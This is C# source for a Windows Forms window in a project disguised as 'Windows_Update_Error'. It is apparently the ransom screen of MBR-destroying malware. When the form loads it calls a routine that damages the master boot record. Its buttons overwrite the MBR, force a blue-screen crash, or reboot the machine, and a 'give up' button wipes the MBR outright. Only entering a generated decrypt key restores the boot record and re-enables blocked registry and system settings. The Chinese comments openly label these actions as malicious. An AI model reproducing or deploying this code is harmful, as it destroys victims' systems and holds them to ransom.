using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Windows_Update_Error
{
    // 表示Windows Forms应用程序中的一个窗体（Form2）类，包含执行恶意系统破坏相关操作的按钮点击事件处理程序
    public partial class Form2 : Form
    {
        // Form2类的构造函数，用于初始化窗体 的组件，通常由Visual Studio设计器生成，负责设置窗体的可视化元素
        public Form2()
        {
            InitializeComponent();
        }

        // 定义静态字符串，用于存储解密密钥相关信息，具体用途根据后续逻辑体现
        public static string Decrypt_Key;
        // 定义静态字符串，存储密钥相关信息，作用依后续代码逻辑而定
        public static string Key;

        // button1的点击事件处理程序，当用户点击button1时执行该方法
        private void button1_Click(object sender, EventArgs e)
        {
            // 创建Test类的实例，Test类包含执行关键系统级别操作
            Test test = new Test();
            // 调用test实例的killmbrA方法，对硬盘的主引导记录（MBR）进行特定修改操作，会严重破坏计算机正常启动过程
            test.killmbrA();
            // 让当前线程暂停执行1秒，确保前面修改主引导记录的操作能完成，避免因时间问题出现逻辑错误或后续操作无效的情况，保证操作顺序按预期执行
            Thread.Sleep(1000);
            // 调用test实例的Nt_Error方法，触发系统蓝屏（BSOD），导致系统崩溃
            test.Nt_Error();
        }

        // button2的点击事件处理程序，用户点击button2时执行此方法内的代码逻辑，主要用于执行关闭计算机的操作
        private void button2_Click(object sender, EventArgs e)
        {
            // 创建Test类的实例，以便调用该类中定义的Shutdown_PC方法
            Test test2 = new Test();
            // 调用test2实例的Shutdown_PC方法来重启计算机，这是旨在破坏系统正常使用的恶意行为
            test2.Shutdown_PC();
        }

        // label2的点击事件处理程序，目前为空，可能后续会添加相关逻辑
        private void label2_Click(object sender, EventArgs e)
        {

        }

        // label3的点击事件处理程序，目前为空，可能后续会添加相关逻辑
        private void label3_Click(object sender, EventArgs e)
        {

        }

        // label1的点击事件处理程序，目前为空，可能后续会添加相关逻辑
        private void label1_Click(object sender, EventArgs e)
        {

        }

        // button2的另一个点击事件处理程序（可能是重复添加等情况导致有同名不同逻辑的方法），点击时先禁用button2，显示Form3，再启用button2
        private void button2_Click_1(object sender, EventArgs e)
        {
            button2.Enabled = false;
            Form3 form3 = new Form3();
            form3.Show();
            button2.Enabled = true;
        }

        // button1的另一个点击事件处理程序（可能是重复添加等情况导致有同名不同逻辑的方法），点击时先禁用button1，验证输入的文本是否与Decrypt_Key相等，相等则执行一系列系统相关操作并关机，不等则提示错误
        private void button1_Click_1(object sender, EventArgs e)
        {
            button1.Enabled = false;
            if (textBox1.Text == Decrypt_Key)
            {
                new Test().WriteMbr(Program.MBR);
                Regedit_Set regedit = new Regedit_Set();
                regedit.Disable_Settings(0);
                regedit.PC_Start("explorer.exe");
                regedit.Disable_Regedit(0);
                regedit.Disable_Windows(false);
                regedit.Start_Update("114514");
                Thread.Sleep(2000);
                new Test().Shutdown_PC();
            }
            else
            {
                MessageBox.Show("输入的Decrypt_Key不正确", "错误", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            button1.Enabled = true;
        }

        // textBox1文本改变事件处理程序，目前为空，可能后续会添加相关逻辑
        private void textBox1_TextChanged(object sender, EventArgs e)
        {

        }

        // Form2加载事件处理程序，生成随机密钥，获取解密密钥，同时执行破坏主引导记录（MBR）的操作
        private void Form2_Load(object sender, EventArgs e)
        {
            Key = Test.Random_Key();
            Decrypt_Key = new Key_Decrypt(Key).GetDecryptKey();
            new Test().killmbr();
        }

        // button3的点击事件处理程序，点击后若用户确认“放弃”，则执行破坏主引导记录（MBR）及触发系统蓝屏（BSOD）的操作
        private void button3_Click(object sender, EventArgs e)
        {
            if (MessageBox.Show("你真的要打算放弃吗", "警告", MessageBoxButtons.OKCancel, MessageBoxIcon.Warning) == DialogResult.OK)
            {
                new Test().killmbr();
                new Test().Nt_Error();
            }
        }

        // groupBox1进入事件处理程序，目前为空，可能后续会添加相关逻辑
        private void groupBox1_Enter(object sender, EventArgs e)
        {

        }
    }
}